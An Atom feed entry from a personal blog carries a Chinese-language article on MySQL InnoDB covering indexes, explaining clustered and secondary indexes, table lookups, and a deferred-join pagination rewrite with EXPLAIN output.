    <id>https://jiemin.wang/2019/03/29/CoveringIndex/</id>
    <published>2019-03-29T05:22:16.000Z</published>
    <updated>2019-03-29T09:59:50.159Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="hehe.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x8001;&#x7238;&#x4E0D;&#x662F;&#x674E;&#x5609;&#x8BDA;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x6211;&#x957F;&#x7684;&#x8FD9;&#x4E48;&#x5E05;&#xFF0C;&#x4F46;&#x662F;&#x8981;&#x6389;&#x5934;&#x53D1;&#x5462;&#xFF0C;&#x4F60;&#x4EEC;&#x957F;&#x8FD9;&#x4E48;&#x4E11;&#xFF0C;&#x5374;&#x4E0D;&#x6389;&#x5934;&#x53D1;&#x5462;&#xFF1F;</strong></p></blockquote><h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x5728;&#x7F51;&#x4E0A;&#x968F;&#x4FBF;&#x641C;&#x641C;&#xFF0C;&#x5C31;&#x80FD;&#x627E;&#x5230;&#x5927;&#x628A;&#x7684;&#x5173;&#x4E8E; MySQL &#x4F18;&#x5316;&#x7684;&#x6587;&#x7AE0;&#xFF0C;&#x4E0D;&#x8FC7;&#x91CC;&#x9762;&#x5F88;&#x591A;&#x90FD;&#x4E0D;&#x51C6;&#x786E;&#xFF0C;&#x8BF4;&#x4E2A;&#x5E38;&#x89C1;&#x7684;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT a FROM ... WHERE b = ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x4F1A;&#x544A;&#x8BEB;&#x4F60;&#x7C7B;&#x4F3C;&#x8FD9;&#x6837;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x4E0D;&#x8981;&#x5728; &#x201C;a&#x201D; &#x5B57;&#x6BB5;&#x4E0A;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#xFF0C;&#x800C;&#x5E94;&#x8BE5;&#x5728; &#x201C;b&#x201D; &#x4E0A;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x3002;&#x8FD9;&#x6837;&#x505A;&#x786E;&#x5B9E;&#x4E0D;&#x9519;&#xFF0C;&#x4F46;&#x662F;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x8FD9;&#x5E76;&#x4E0D;&#x662F;&#x6700;&#x4F73;&#x7ED3;&#x679C;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD9;&#x6837;&#x8BF4;&#xFF1F;&#x8FD9;&#x8FD8;&#x5F97;&#x5148;&#x4ECE;&#x7D22;&#x5F15;&#x6765;&#x8BF4;&#x8D77;&#x3002;</p><h4 id="&#x7D22;&#x5F15;"><a href="#&#x7D22;&#x5F15;" class="headerlink" title="&#x7D22;&#x5F15;"></a>&#x7D22;&#x5F15;</h4><p>MySQL &#x5B98;&#x65B9;&#x5BF9;&#x7D22;&#x5F15;&#x7684;&#x5B9A;&#x4E49;&#x4E3A;&#xFF1A;&#x7D22;&#x5F15;&#xFF08;Index&#xFF09;&#x662F;&#x5E2E;&#x52A9; MySQL &#x9AD8;&#x6548;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x3002;&#x63D0;&#x53D6;&#x53E5;&#x5B50;&#x4E3B;&#x5E72;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7D22;&#x5F15;&#x7684;&#x672C;&#x8D28;&#xFF1A;&#x7D22;&#x5F15;&#x662F;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x3002;</p><p>&#x5728; MySQL &#x4E2D;&#xFF0C;&#x7D22;&#x5F15;&#x5C5E;&#x4E8E;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x7EA7;&#x522B;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4E0D;&#x540C;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5BF9;&#x7D22;&#x5F15;&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x672C;&#x6587;&#x8BA8;&#x8BBA;&#x7684;&#x4E3B;&#x8981;&#x662F; InnoDB &#x7684; B+Tree &#x7D22;&#x5F15;&#xFF0C;&#x5B83;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E24;&#x7C7B;&#xFF1A;</p><ul><li>&#x805A;&#x7C07;&#x7D22;&#x5F15;</li><li>&#x975E;&#x805A;&#x7C07;&#x7D22;&#x5F15;</li></ul><p>&#x805A;&#x7C07;&#x7D22;&#x5F15;&#x53C8;&#x79F0;&#x4E3A;&#x805A;&#x96C6;&#x7D22;&#x5F15;&#x6216;&#x4E3B;&#x952E;&#x7D22;&#x5F15;&#xFF0C;&#x5B83;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x5355;&#x72EC;&#x7684;&#x7D22;&#x5F15;&#x7C7B;&#x578B;&#xFF0C;&#x800C;&#x662F;&#x4E00;&#x79CD;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x3002;&#x5728; InnoDB &#x4E2D;&#xFF0C;&#x8868;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x6309; B+Tree &#x7EC4;&#x7EC7;&#x7684;&#x4E00;&#x4E2A;&#x7D22;&#x5F15;&#x7ED3;&#x6784;&#xFF0C;&#x8FD9;&#x68F5;&#x6811;&#x7684;&#x53F6;&#x5B50;&#x8282;&#x70B9;&#x79F0;&#x4E3A; leaf page&#xFF0C;&#x5176; data &#x57DF;&#x4FDD;&#x5B58;&#x4E86;&#x5B8C;&#x6574;&#x7684;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x3002;&#x4E5F;&#x5373;&#x6211;&#x4EEC;&#x6240;&#x8BF4;&#x7684;&#x6570;&#x636E;&#x884C;&#x5373;&#x7D22;&#x5F15;&#xFF0C;&#x7D22;&#x5F15;&#x5373;&#x6570;&#x636E;&#x3002;<br><img src="/2019/03/29/CoveringIndex/Primary_key.jpg" title="Primary_key"></p><p>&#x975E;&#x805A;&#x7C07;&#x7D22;&#x5F15;&#x662F;&#x76F8;&#x5BF9;&#x4E8E;&#x805A;&#x7C07;&#x7D22;&#x5F15;&#x6765;&#x8BF4;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x53C8;&#x79F0;&#x4E3A;&#x8F85;&#x52A9;&#x7D22;&#x5F15;&#x6216;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x3002; InnoDB &#x7684;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15; data &#x57DF;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x76F8;&#x5E94;&#x8BB0;&#x5F55;&#x4E3B;&#x952E;&#x7684;&#x503C;&#x800C;&#x4E0D;&#x662F;&#x7269;&#x7406;&#x4F4D;&#x7F6E;&#x7684;&#x6307;&#x9488;&#x3002;<br><img src="/2019/03/29/CoveringIndex/Secoudary_key.jpg" title="Secoudary_key"></p><h4 id="&#x56DE;&#x8868;"><a href="#&#x56DE;&#x8868;" class="headerlink" title="&#x56DE;&#x8868;"></a>&#x56DE;&#x8868;</h4><p>&#x4E86;&#x89E3;&#x4E86; InnoDB &#x7D22;&#x5F15;&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3; &#x201C;&#x56DE;&#x8868;&#x201D; &#x8FD9;&#x4E2A;&#x6982;&#x5FF5;&#x4E86;&#x3002;</p><p>&#x805A;&#x7C07;&#x7D22;&#x5F15;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x4F7F;&#x5F97;&#x6309;&#x4E3B;&#x952E;&#x7684;&#x641C;&#x7D22;&#x5341;&#x5206;&#x9AD8;&#x6548;&#xFF0C;&#x4F46;&#x662F;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x641C;&#x7D22;&#x9700;&#x8981;&#x68C0;&#x7D22;&#x4E24;&#x904D;&#x7D22;&#x5F15;&#xFF1A;&#x9996;&#x5148;&#x68C0;&#x7D22;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x83B7;&#x5F97;&#x4E3B;&#x952E;&#xFF0C;&#x7136;&#x540E;&#x7528;&#x4E3B;&#x952E;&#x5230;&#x4E3B;&#x7D22;&#x5F15;&#x4E2D;&#x68C0;&#x7D22;&#x83B7;&#x5F97;&#x8BB0;&#x5F55;&#x3002;</p><p>&#x8BA9;&#x6211;&#x4EEC;&#x56DE;&#x5230;&#x5F00;&#x5934;&#x8BF4;&#x7684;&#x90A3;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT a FROM ... WHERE b = ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x5148;&#x6765;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x67E5;&#x8BE2;&#x7684;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#xFF1A;&#x5728;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x67E5;&#x8BE2; &#x201C;b&#x201D; &#x7D22;&#x5F15;&#x8FDB;&#x884C;&#x5B9A;&#x4F4D;&#xFF0C;&#x7136;&#x540E;&#x56DE;&#x8868;&#x67E5;&#x8BE2;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E; &#x201C;a&#x201D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5728;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x4E2D;&#x5B58;&#x5728;&#x4E24;&#x6B21;&#x67E5;&#x8BE2;&#xFF0C;&#x4E00;&#x6B21;&#x662F;&#x67E5;&#x8BE2;&#x7D22;&#x5F15;&#xFF0C;&#x53E6;&#x4E00;&#x6B21;&#x662F;&#x67E5;&#x8BE2;&#x8868;&#x3002;</p><p>&#x90A3;&#x6709;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x7528;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x641E;&#x5B9A;&#x95EE;&#x9898;&#x5462;&#xFF1F;&#x6709;&#xFF0C;&#x5C31;&#x662F; Covering Index&#xFF01;</p><blockquote><p>&#x8BF4;&#x5230;&#x8FD9;&#x91CC;&#x4F60;&#x53EF;&#x80FD;&#x4F1A;&#x60F3;&#x8D77;&#x6765; MySQL5.6 &#x4E2D;&#x5F15;&#x5165;&#x7684; MRR&#xFF08;Multi-Range Read&#xFF0C;&#x591A;&#x8303;&#x56F4;&#x8BFB;&#xFF09;&#xFF0C;&#x5B83;&#x662F;&#x4E13;&#x95E8;&#x6765;&#x4F18;&#x5316;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x7684;&#x8303;&#x56F4;&#x626B;&#x63CF;&#x5E76;&#x4E14;&#x9700;&#x8981;&#x56DE;&#x8868;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x5B83;&#x7684;&#x539F;&#x7406;&#x662F;&#xFF0C;&#x5C06;&#x591A;&#x4E2A;&#x9700;&#x8981;&#x56DE;&#x8868;&#x7684;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x6839;&#x636E;&#x4E3B;&#x952E;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x8D77;&#x56DE;&#x8868;&#xFF0C;&#x5C06;&#x539F;&#x6765;&#x7684;&#x56DE;&#x8868;&#x65F6;&#x8FDB;&#x884C;&#x7684;&#x968F;&#x673A; IO&#xFF0C;&#x8F6C;&#x53D8;&#x6210;&#x987A;&#x5E8F; IO&#x3002;MRR &#x7684;&#x4F18;&#x52BF;&#x662F;&#x5C06;&#x591A;&#x4E2A;&#x968F;&#x673A; IO &#x8F6C;&#x6362;&#x6210;&#x8F83;&#x5C11;&#x6570;&#x91CF;&#x7684;&#x987A;&#x5E8F; IO&#xFF0C;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E; SSD &#x6765;&#x8BF4;&#x4EF7;&#x503C;&#x8FD8;&#x662F;&#x6709;&#x7684;&#xFF0C;&#x4F46;&#x662F;&#x76F8;&#x6BD4;&#x673A;&#x68B0;&#x78C1;&#x76D8;&#x6765;&#x8BF4;&#x610F;&#x4E49;&#x5C0F;&#x4E00;&#x4E9B;&#x3002;</p></blockquote><h2 id="Covering-Index"><a href="#Covering-Index" class="headerlink" title="Covering Index"></a>Covering Index</h2><p>&#x6240;&#x8C13; Covering Index&#xFF0C;&#x5C31;&#x662F;&#x8BF4;&#x4E0D;&#x5FC5;&#x67E5;&#x8BE2;&#x8868;&#x6587;&#x4EF6;&#xFF0C;&#x5355;&#x9760;&#x67E5;&#x8BE2;&#x7D22;&#x5F15;&#x6587;&#x4EF6;&#x5373;&#x53EF;&#x5B8C;&#x6210;&#x3002;&#x4F7F;&#x7528;&#x8986;&#x76D6;&#x7D22;&#x5F15;&#x7684;&#x597D;&#x5904;&#x662F;&#x8F85;&#x52A9;&#x7D22;&#x5F15;&#x4E0D;&#x5305;&#x542B;&#x6574;&#x884C;&#x8BB0;&#x5F55;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x606F;&#xFF0C;&#x6545;&#x5176;&#x5927;&#x5C0F;&#x8981;&#x8FDC;&#x5C0F;&#x4E8E;&#x805A;&#x96C6;&#x7D22;&#x5F15;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x51CF;&#x5C11;&#x5927;&#x91CF;&#x7684; IO &#x64CD;&#x4F5C;&#x3002;</p><p>&#x5177;&#x4F53;&#x5230;&#x4E0A;&#x8FB9;&#x7684;&#x4F8B;&#x5B50;&#x4E2D;&#x5C31;&#x662F;&#x5EFA;&#x7ACB;&#x4E00;&#x4E2A;&#x590D;&#x5408;&#x7D22;&#x5F15; (b, a)&#xFF0C;&#x5F53;&#x67E5;&#x8BE2;&#x8FDB;&#x884C;&#x65F6;&#xFF0C;&#x901A;&#x8FC7;&#x590D;&#x5408;&#x7D22;&#x5F15;&#x7684; &#x201C;b&#x201D; &#x90E8;&#x5206;&#x53BB;&#x5B9A;&#x4F4D;&#xFF0C;&#x81F3;&#x4E8E;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E; &#x201C;a&#x201D;&#xFF0C;&#x7ACB;&#x523B;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x7D22;&#x5F15;&#x91CC;&#x5F97;&#x5230;&#xFF0C;&#x4ECE;&#x800C;&#x7701;&#x7565;&#x4E86;&#x8868;&#x67E5;&#x8BE2;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p><p>&#x5982;&#x679C;&#x4F60;&#x60F3;&#x5229;&#x7528; Covering Index&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8981;&#x6CE8;&#x610F; SELECT &#x65B9;&#x5F0F;&#xFF0C;&#x53EA; SELECT &#x5FC5;&#x8981;&#x7684;&#x5B57;&#x6BB5;&#xFF0C;&#x5343;&#x4E07;&#x522B;SELECT * FROM &#x2026;&#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x4E0D;&#x592A;&#x53EF;&#x80FD;&#x628A;&#x6240;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#x4E00;&#x8D77;&#x505A;&#x7D22;&#x5F15;&#xFF0C;&#x867D;&#x7136;&#x53EF;&#x4EE5;&#x90A3;&#x6837;&#x505A;&#xFF0C;&#x4F46;&#x90A3;&#x6837;&#x4F1A;&#x8BA9;&#x7D22;&#x5F15;&#x6587;&#x4EF6;&#x8FC7;&#x5927;&#xFF0C;&#x7ED3;&#x679C;&#x53CD;&#x5012;&#x4F1A;&#x5F04;&#x5DE7;&#x6210;&#x62D9;&#x3002;</p><p>&#x5982;&#x4F55;&#x624D;&#x80FD;&#x786E;&#x8BA4;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x4E86; Covering Index &#x5462;&#xFF1F;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F7F;&#x7528; EXPLAIN &#x5373;&#x53EF;&#xFF01;&#x53EA;&#x8981;&#x5728; Extra &#x91CC;&#x51FA;&#x73B0;Using index&#x5C31;&#x8BF4;&#x660E;&#x4F7F;&#x7528;&#x7684;&#x662F; Covering Index&#x3002;</p><p>&#x8FD9;&#x91CC;&#x518D;&#x4E3E;&#x4E24;&#x4E2A;&#x6817;&#x5B50;&#xFF0C;&#x8BA9;&#x5927;&#x5BB6;&#x5370;&#x8C61;&#x6DF1;&#x70B9;&#x3002;</p><p>&#x4F8B;&#x5B50;&#x4E00;</p><p>&#x5728;&#x6587;&#x7AE0;&#x7CFB;&#x7EDF;&#x91CC;&#x7EDF;&#x8BA1;&#x603B;&#x6570;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x67E5;&#x8BE2;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(*) FROM article WHERE category_id = ...</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F53;&#x6211;&#x4EEC;&#x5728;<code>category_id</code>&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x540E;&#xFF0C;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x7684;&#x5C31;&#x662F; Covering Index&#x3002;</p><blockquote><p>&#x53C2;&#x8003;&#x6587;&#x6863;&#xFF1A;<a href="https://www.percona.com/blog/2007/04/10/count-vs-countcol/" target="_blank" rel="noopener">COUNT(*) vs COUNT(col)</a></p></blockquote><p>&#x4F8B;&#x5B50;&#x4E8C;<br>&#x5728;&#x6587;&#x7AE0;&#x7CFB;&#x7EDF;&#x91CC;&#x5206;&#x9875;&#x663E;&#x793A;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E00;&#x822C;&#x7684;&#x67E5;&#x8BE2;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, title, content FROM article ORDER BY created DESC LIMIT 10000, 10;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x901A;&#x5E38;&#x8FD9;&#x6837;&#x7684;&#x67E5;&#x8BE2;&#x4F1A;&#x628A;&#x7D22;&#x5F15;&#x5EFA;&#x5728;created&#x5B57;&#x6BB5;&#xFF08;&#x5176;&#x4E2D;id&#x662F;&#x4E3B;&#x952E;&#xFF09;&#xFF0C;&#x4E0D;&#x8FC7;&#x5F53;LIMIT&#x504F;&#x79FB;&#x5F88;&#x5927;&#x65F6;&#xFF0C;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x4ECD;&#x7136;&#x5F88;&#x4F4E;&#xFF0C;&#x8FD9;&#x65F6;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x6700;&#x597D;&#x6539;&#x6210;&#x4E0B;&#x9762;&#x7684;&#x6837;&#x5B50;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT id, title, content FROM article</span><br><span class="line">INNER JOIN (</span><br><span class="line">    SELECT id FROM article ORDER BY created DESC LIMIT 10000, 10</span><br><span class="line">) AS page USING(id);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x5B50;&#x67E5;&#x8BE2;&#x91CC;&#x5229;&#x7528;&#x4E0A; Covering Index&#xFF0C;&#x5FEB;&#x901F;&#x5B9A;&#x4F4D; id&#xFF0C;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#x55F7;&#x55F7;&#x7684;&#x3002;</p><p>&#x57FA;&#x4E8E;&#x6211;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#xFF0C;&#x8FD9;&#x4E24;&#x6761;&#x8BED;&#x53E5;&#x7684;&#x67E5;&#x8BE2;&#x8017;&#x65F6;&#x5206;&#x522B;&#x662F; &#x201C;0.08 &#x79D2;&#x201D; &#x548C;&#x201C;0.01 &#x79D2;&#x4EE5;&#x5185;&#x201D;&#xFF0C;8 &#x500D;&#x7684;&#x5DEE;&#x8DDD;&#x554A;&#xFF01;&#x4E0D;&#x7531;&#x53C8;&#x60F3;&#x8D77;&#x4E86;&#x5730;&#x7CBE;&#x7684;&#x7ECF;&#x5178;&#x8BED;&#x5F55;<br></p><blockquote class="blockquote-center"><p>&#x65F6;&#x95F4;&#x5C31;&#x662F;&#x91D1;&#x94B1;&#xFF0C;&#x6211;&#x7684;&#x670B;&#x53CB;&#xFF01;</p></blockquote><p></p><blockquote><p>&#x8865;&#x5145;&#xFF1A;InnoDB &#x5F15;&#x64CE;&#x5C42;&#x662F;&#x4F1A;&#x5BF9;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x505A;&#x81EA;&#x52A8;&#x6269;&#x5C55;&#xFF0C;&#x4F18;&#x5316;&#x5668;&#x80FD;&#x8BC6;&#x522B;&#x51FA;&#x6269;&#x5C55;&#x7684;&#x4E3B;&#x952E;&#x3002;&#x8BE6;&#x60C5;&#x53EF;&#x4EE5;&#x53C2;&#x8003;<a href="https://blog.51cto.com/huanghualiang/1607496" target="_blank" rel="noopener">&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;</a>&#x3002;</p></blockquote><p>&#x6211;&#x4EEC;&#x518D;&#x6765;&#x770B;&#x770B;&#x8FD9;&#x4E24;&#x6761;&#x8BED;&#x53E5;&#x5206;&#x522B;&#x5BF9;&#x5E94;&#x7684;&#x6267;&#x884C;&#x8BA1;&#x5212;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; EXPLAIN SELECT SQL_NO_CACHE id, title, content FROM article ORDER BY created DESC LIMIT 10000, 10;</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+</span><br><span class="line">| id | select_type | table   | partitions | <span class="built_in">type</span> | possible_keys | key  | key_len | ref  | rows  | filtered | Extra          |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+</span><br><span class="line">|  1 | SIMPLE      | article | NULL       | ALL  | NULL          | NULL | NULL    | NULL | 99210 |   100.00 | Using filesort |</span><br><span class="line">+----+-------------+---------+------------+------+---------------+------+---------+------+-------+----------+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span>, 2 warnings (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; EXPLAIN SELECT SQL_NO_CACHE id, title, content FROM article INNER JOIN ( SELECT id FROM article ORDER BY created DESC LIMIT 10000, 10 ) AS page USING(id);</span><br><span class="line">+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+</span><br><span class="line">| id | select_type | table      | partitions | <span class="built_in">type</span>   | possible_keys | key         | key_len | ref     | rows  | filtered | Extra                            |</span><br><span class="line">+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+</span><br><span class="line">|  1 | PRIMARY     | &lt;derived2&gt; | NULL       | ALL    | NULL          | NULL        | NULL    | NULL    | 10010 |   100.00 | NULL                             |</span><br><span class="line">|  1 | PRIMARY     | article    | NULL       | eq_ref | PRIMARY       | PRIMARY     | 4       | page.id |     1 |   100.00 | NULL                             |</span><br><span class="line">|  2 | DERIVED     | article    | NULL       | index  | NULL          | idx_created | 5       | NULL    | 10010 |   100.00 | Backward index scan; Using index |</span><br><span class="line">+----+-------------+------------+------------+--------+---------------+-------------+---------+---------+-------+----------+----------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span>, 2 warnings (0.00 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x901A;&#x8FC7; EXPLAIN &#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F88;&#x660E;&#x663E;&#x7684;&#x770B;&#x51FA;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x6CA1;&#x6709;&#x7528;&#x5230;&#x7D22;&#x5F15;&#xFF0C;Extra &#x91CC;&#x662F; &#x201C;Using filesort&#x201D;&#xFF0C;&#x8FD9;&#x662F;&#x6211;&#x4EEC;&#x5E94;&#x8BE5;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x7684;&#x60C5;&#x51B5;&#x3002;&#x800C;&#x7B2C;&#x4E8C;&#x4E2A;&#x7684; Extra &#x662F; &#x201C;Using index&#x201D;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x4E24;&#x8005;&#x95F4;&#x6548;&#x7387;&#x4E0A;&#x7684;&#x5DEE;&#x8DDD;&#x5C31;&#x663E;&#x800C;&#x6613;&#x89C1;&#x4E86;&#x3002;</p><h2 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h2><p>Covering Index &#x5E76;&#x4E0D;&#x662F;&#x4EC0;&#x4E48;&#x5F88;&#x96BE;&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x4E9B;&#x4EBA;&#x8FD8;&#x4E0D;&#x4E86;&#x89E3;&#x5B83;&#x6216;&#x5FFD;&#x89C6;&#x5B83;&#x7684;&#x4EF7;&#x503C;&#xFF0C;&#x5E0C;&#x671B;&#x672C;&#x6587;&#x80FD;&#x7ED9;&#x4F60;&#x63D0;&#x4E2A;&#x9192;&#x3002;</p><h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><ul><li><a href="https://yq.aliyun.com/articles/62419" target="_blank" rel="noopener">MySQL &#x8986;&#x76D6;&#x7D22;&#x5F15;</a></li><li><a href="https://www.jianshu.com/p/fa24238d84a9" target="_blank" rel="noopener">MySQL &#x7D22;&#x5F15;&#x80CC;&#x540E;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x53CA;&#x7B97;&#x6CD5;&#x539F;&#x7406;</a></li><li><a href="https://segmentfault.com/a/1190000010264071" target="_blank" rel="noopener">MySQL &#x8BA4;&#x8BC6;&#x7D22;&#x5F15;</a></li><li><a href="https://huoding.com/2018/02/27/656" target="_blank" rel="noopener">&#x8C08;&#x8C08; SQL &#x67E5;&#x8BE2;&#x4E2D;&#x56DE;&#x8868;&#x5BF9;&#x6027;&#x80FD;&#x7684;&#x5F71;&#x54CD;</a></li><li><a href="http://www.cnblogs.com/digdeep/p/4995039.html" target="_blank" rel="noopener">MySQL &#x4F18;&#x5316;&#x4E4B; MRR (Multi-Range Read: &#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x5408;&#x5E76;&#x56DE;&#x8868;)</a></li><li><a href="https://blog.51cto.com/huanghualiang/1607496" target="_blank" rel="noopener">&#x5173;&#x4E8E; MySQL InnoDB &#x8868;&#x7684;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x662F;&#x5426;&#x52A0;&#x5165;&#x4E3B;&#x952E;&#x5217;&#x7684;&#x95EE;&#x9898;&#x89E3;&#x91CA;</a></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;hehe.jpg&quot; class=&quot;full-image&quot; alt=&quot;a
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>rsync 命令详解</title>
